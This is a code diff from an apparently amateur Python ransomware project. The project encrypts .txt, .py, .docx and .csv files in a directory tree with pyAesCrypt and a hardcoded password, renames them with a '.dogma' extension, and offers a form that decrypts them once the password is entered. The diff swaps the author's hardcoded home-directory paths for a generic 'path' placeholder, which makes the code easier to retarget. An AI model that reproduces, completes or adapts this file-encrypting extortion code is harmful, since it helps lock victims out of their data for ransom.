@@ -22,7 +22,7 @@ import pyAesCrypt
 version = "1.5.2"
 
 # Get dogma file
-f = open("/home/golcatlman/PycharmProjects/RansomeWare/dogma_file.txt", "w")
+f = open("path", "w")
 
 # encryption/decryption buffer size - 64K
 bufferSize = 64 * 1024
@@ -31,7 +31,7 @@ password = "12345"
 
 # Encrypte file
 def encrypt():
-    for root_path, dirs, files in os.walk("/home/golcatlman/PycharmProjects/RansomeWare/Encrypted_Data/"):
+    for root_path, dirs, files in os.walk("path"):
         for file in files:
             if file.endswith((".txt", ".py", ".docx", ".csv")):  # The arg can be a tuple of suffixes to look for
                 unique_file = os.path.join(file)
@@ -49,8 +49,7 @@ encrypt()
 
 # Get and write in file dogma file list
 def get_and_write_dogma_file():
-    for root_path, dirs, files in os.walk("/home/golcatlman/PycharmProjects/"
-                                          "RansomeWare/Encrypted_Data/"):
+    for root_path, dirs, files in os.walk("path"):
         for file in files:
             if file.endswith(".dogma"):  # The arg can be a tuple of suffixes to look for
                 f.write(str(file) + os.linesep)
@@ -62,7 +61,7 @@ get_and_write_dogma_file()
 f.close()
 
 # Open Output dogma file
-ai = open("/home/golcatlman/PycharmProjects/RansomeWare/dogma_file.txt", "r")
+ai = open("path", "r")
 content = ai.read()
 
 
@@ -249,8 +248,7 @@ class Form:
         if self.user_input == "12345":
 
             try:
-                for root_path, dirs, files in os.walk("/home/golcatlman/PycharmProjects/"
-                                                      "RansomeWare/Encrypted_Data/"):
+                for root_path, dirs, files in os.walk("path"):
                     for file in files:
                         if file.endswith(".dogma"):  # The arg can be a tuple of suffixes to look for
 
